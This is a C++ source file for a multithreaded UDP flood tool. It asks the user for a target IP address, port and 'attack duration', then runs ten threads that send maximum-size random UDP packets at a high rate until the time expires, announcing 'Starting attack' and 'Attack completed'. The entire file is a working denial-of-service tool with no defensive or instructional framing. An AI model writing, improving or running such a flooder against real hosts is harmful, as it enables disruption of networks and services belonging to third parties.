#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <cstring>
#include <netinet/in.h>
#include <pthread.h>
#include <vector>
#include <random>
using namespace std;

// Configuration
unsigned int packet_rate = 10000;  // Increased packet rate
int max_payload = 1472;  // Maximum UDP payload without fragmentation
int thread_count = 10;  // Number of parallel threads

// Target information
struct Target {
    char ip_str[16];
    in_addr ip;
    unsigned short port;
};

// Thread data structure
struct ThreadData {
    Target target;
    int duration;
    int thread_id;
};

// Random number generator
random_device rd;
mt19937 gen(rd());
uniform_int_distribution<> dis(0, 255);

// Create random payload
void create_payload(char* payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = dis(gen);
    }
}

// Optimized packet sending function
void* send_packets(void* arg) {
    ThreadData* data = (ThreadData*)arg;
    Target target = data->target;
    
    // Create socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        cerr << "Thread " << data->thread_id << ": Socket creation failed" << endl;
        return NULL;
    }
    
    // Set socket buffer size
    int buffer_size = 212992;  // 208KB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Prepare target address
    sockaddr_in addr;
    memset(&addr, 0, sizeof(sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target.port);
    addr.sin_addr = target.ip;
    
    // Create payload
    char payload[max_payload];
    create_payload(payload, max_payload);
    
    // Calculate end time
    time_t start_time = time(NULL);
    time_t end_time = start_time + data->duration;
    
    // Send packets until duration expires
    while (time(NULL) < end_time) {
        for (int i = 0; i < packet_rate / thread_count; i++) {
            // Randomize payload occasionally
            if (i % 100 == 0) {
                create_payload(payload, max_payload);
            }
            
            // Send packet
            sendto(sock, payload, max_payload, 0, (sockaddr*)&addr, sizeof(addr));
        }
    }
    
    close(sock);
    cout << "Thread " << data->thread_id << " completed" << endl;
    return NULL;
}

int main() {
    // Get target information
    Target target;
    cout << "Enter target IP address: ";
    cin >> target.ip_str;
    
    cout << "Enter target port: ";
    cin >> target.port;
    
    int duration;
    cout << "Enter attack duration in seconds: ";
    cin >> duration;
    
    // Convert IP string to binary form
    if (inet_aton(target.ip_str, &target.ip) == 0) {
        cerr << "Invalid IP address format" << endl;
        return 1;
    }
    
    // Create threads
    vector<pthread_t> threads(thread_count);
    vector<ThreadData> thread_data(thread_count);
    
    cout << "Starting attack on " << target.ip_str << ":" << target.port;
    cout << " for " << duration << " seconds with " << thread_count << " threads" << endl;
    
    // Start all threads
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].target = target;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        
        if (pthread_create(&threads[i], NULL, send_packets, &thread_data[i]) != 0) {
            cerr << "Failed to create thread " << i << endl;
        }
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    cout << "Attack completed" << endl;
    return 0;
}